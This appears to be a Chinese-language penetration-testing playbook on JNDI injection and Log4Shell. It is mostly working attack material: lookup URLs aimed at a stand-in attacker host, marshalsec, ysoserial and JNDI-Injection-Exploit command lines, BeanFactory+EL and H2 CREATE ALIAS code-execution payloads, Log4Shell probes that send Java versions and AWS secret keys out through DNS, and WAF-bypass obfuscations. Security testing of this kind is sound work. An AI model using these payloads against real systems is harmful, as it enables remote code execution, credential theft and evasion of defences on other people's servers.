---

phase: webapp
vuln_class: [jndi, injection, rce]
title: JNDI 注入测试
summary: JNDI 注入的判据是「用户输入能进 InitialContext.lookup()」。能不能 RCE 取决于 JDK 版本和 classpath 上的 gadget —— 先只打 DNS 确认，再按版本选链。
---

# JNDI 注入测试

## 0. 判据速查

| 观察到的现象 | 说明 | 去哪节 |
|---|---|---|
| 某个参数被当作「资源名/数据源名」查询 | `InitialContext.lookup(userInput)` 的入口 | §1 |
| 打 DNS 探针后协作平台收到查询 | **确认存在 JNDI 求值**，但还没 RCE | §2.3 |
| 日志里出现 `${...}` 被解析（Log4j2） | Log4Shell，任何被记录的字符串都是入口 | §5 |
| 报错里带 `java.version` / JDK 版本 | 直接决定能走哪条链 | §3 |
| `/h2-console` 可访问且能改 JDBC URL | H2 控制台这条窄路 | §6.1 |
| 有 Fastjson / Spring / Solr / Druid | 各自有 JNDI sink | §6 |

**核心判据**：JNDI 注入本身只保证「JVM 会去连你给的地址」。**从「连上了」到「执行了命令」中间隔着 JDK 版本和 classpath** —— 这三件事必须分开确认，否则会把「DNS 有回显」误报成 RCE。

---

## 1. 机制

JNDI 是 Java 的统一命名/目录查询 API，后端可以是 RMI、LDAP、DNS、CORBA。

```java
// 漏洞形态
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);      // name = "ldap://attacker.com/Exploit"
```

`lookup()` 收到攻击者控制的 URL 后，JVM 会连过去并按协议加载/实例化远端对象。

---

## 2. 三种协议

### 2.1 RMI

```
rmi://attacker.com:1099/Exploit
```

攻击者的 RMI 服务返回一个 `Reference`，指向远端 class：

```java
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM 下载 http://attacker.com/Exploit.class 并实例化
```

### 2.2 LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

LDAP 响应里带 `javaCodeBase`、`javaFactory` 或序列化对象属性。

**LDAP 比 RMI 更值得先试**：RMI 的限制加得早（8u121），LDAP 晚（8u191）。8u121–8u190 区间只有 LDAP 能用。

### 2.3 DNS（只做确认）

```
dns://attacker-dns-server/lookup-name
```

只验证「JNDI 确实在求值」，不涉及 RCE。**这是第一步，别跳过。**

---

## 3. JDK 版本决定走哪条链

| JDK | RMI 远端类 | LDAP 远端类 | 走法 |
|---|---|---|---|
| < 8u121 | 可以 | 可以 | 直接加载远端 class |
| 8u121 – 8u190 | 不行（`trustURLCodebase=false`） | 可以 | 走 LDAP |
| ≥ 8u191 | 不行 | 不行 | LDAP 返回**序列化对象**（本地反序列化） |
| ≥ 8u191 备选 | 不行 | 不行 | `BeanFactory` + EL |

### 3.1 ≥ 8u191 之 LDAP 返回序列化 gadget

不再返回远端 class URL，而是把**序列化 Java 对象**塞进 `javaSerializedData` 属性。JVM 在**本地**反序列化 —— classpath 上有 gadget 链（如 CommonsCollections）就能 RCE。

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# JNDI 指向 rmi://attacker:1099/whatever
```

### 3.2 ≥ 8u191 之 BeanFactory + EL

classpath 上有 Tomcat 的 `BeanFactory` 时，LDAP 响应可以把它当工厂，用 EL 表达式构造参数：

```
javaClassName: javax.el.ELProcessor
javaFactory:   org.apache.naming.factory.BeanFactory
forceString:   x=eval
x:             Runtime.getRuntime().exec("id")
```

`forceString` 把属性名映射到 setter 方法，`x=eval` 表示「把 x 的值传给 eval 方法」—— 于是 `x` 的字符串被当 EL 求值。

---

## 4. 工具

```bash
# marshalsec：LDAP / RMI 引用服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099
# #Exploit 指 http://attacker.com/Exploit.class

# 一体化
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
java -jar RogueJndi.jar --command "id" --hostname attacker.com
```

---

## 5. Log4Shell（CVE-2021-44228）

### 5.1 机制

Log4j2 支持 Lookup —— 日志消息里的 `${...}` 会被求值，其中 `jndi` lookup 直接触发 `InitialContext.lookup()`：

```
${jndi:ldap://attacker.com/x}
```

**任何被记录的字符串都是入口** —— User-Agent、表单字段、HTTP 头、URL 路径、错误消息。

### 5.2 探测 payload

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}
```

**带信息外带**：

```text
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

子域名里出现 Java 版本 = 确认存在且能读环境。

### 5.3 WAF 绕过（Lookup 解析器极宽松）

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

`${::-x}` 是「取空串的默认值 x」，`${lower:J}` 转小写，`${env:NaN:-j}` 取不存在的环境变量并回落。这些都等价于字面字符，但字节层面完全不同。

### 5.4 跨日志条目拼接

WAF 只拦单条请求里的完整 `${jndi:...}` 时，拆到两条日志里：

```text
请求 1: X-Custom: ${jndi:ldap://attacker.com/
请求 2: X-Custom: exploit}
```

前提是聚合管道会把多条日志**拼接后再处理**（如日志聚合、批量写入、二次格式化）。

### 5.5 真实案例：Solr

```bash
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS 命中且子域名是 Java 版本 = 确认 Solr 存在 Log4Shell
```

### 5.6 要测的位置

```
User-Agent        X-Forwarded-For    Referer
Accept-Language   X-Api-Version      Authorization
Cookie 值          URL 路径段         POST body 字段
搜索关键词         上传文件名          表单字段名
GraphQL 变量       SOAP/XML 元素       JSON 值
```

### 5.7 影响版本

- Log4j2 **2.0-beta9 到 2.14.1**
- 2.15.0 部分修复，2.17.0 完全修复
- **Log4j 1.x 不受影响**（lookup 机制不同）

---

## 6. 其他 JNDI sink

| 组件 | sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API、VelocityResponseWriter |
| Apache Druid | 多个配置端点 |
| VMware vCenter | 多个端点 |
| H2 Database Console | JDBC 连接串 |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

### 6.1 H2 Console

**认**：Spring Boot 或管理台出现 `/h2-console`；登录表能填 JDBC URL；`web-allow-others` 开了（外网能打开）。**没看到这个页就不要找。**

**打**：

1. JDBC URL 填 `ldap://协作域/Exploit`，或走 `javax.naming.InitialContext`（BeanFactory + EL，JDK ≥ 8u191 常用）。LDAP 侧用 §3.2 的 `javaClassName=javax.el.ELProcessor` + `BeanFactory`。
2. 能进 SQL 页再打：

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

**算成**：命令真的跑起来（DNS 打到 JNDI 只算确认 lookup，还要跟到 exec 或 gadget）。

**假点**：只本机 `localhost` 能开；JDBC URL 写死改不了；`CREATE ALIAS` 被禁。这枪偏窄，**不进短表**，见了再打开本段。

---

## 7. 测试流程

```
怀疑有 JNDI 注入？
├── 先打 DNS 探针：${jndi:dns://TOKEN.collab.net}
│   └── 有 DNS 命中 → 确认 JNDI 在求值
│
├── 取 JDK 版本：${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191？
│   ├── 起 marshalsec LDAP，挂远端 class
│   └── ${jndi:ldap://attacker:1389/Exploit} → 直接 RCE
│
├── JDK >= 8u191？
│   ├── LDAP → 序列化 gadget（需 classpath 上有链）
│   ├── BeanFactory + EL（需 Tomcat 在 classpath）
│   └── ysoserial JRMPListener
│
└── WAF 拦 ${jndi:...}？
    └── 混淆：${${lower:j}ndi:...}
```

---

## 8. 纪律

- **先 DNS，后 RCE**。三件事分开确认：JNDI 在求值（DNS 有回显）、能加载远端类（JDK < 8u191）、能执行（链打通）。把第一步当成功是这类漏洞最常见的误报。
- **JDK 版本是分水岭**。8u191 之后远端 class 加载默认关，必须换序列化 gadget 或 BeanFactory。**先取版本再选链**，别盲试。
- **Log4j 1.x 不受影响**。看到 Log4j 先确认是 1.x 还是 2.x。
- **Log4Shell 的入口是「任何被记录的字符串」**，不只是请求参数。头、Cookie、文件名、URL 路径全要试。
- **WAF 绕过先试 `${lower:}` 系列**，成本最低；跨日志拼接是最后手段（依赖聚合管道，不确定性高）。
- **报的是「执行了命令」不是「DNS 有回显」**。后者只证明 lookup 发生了。
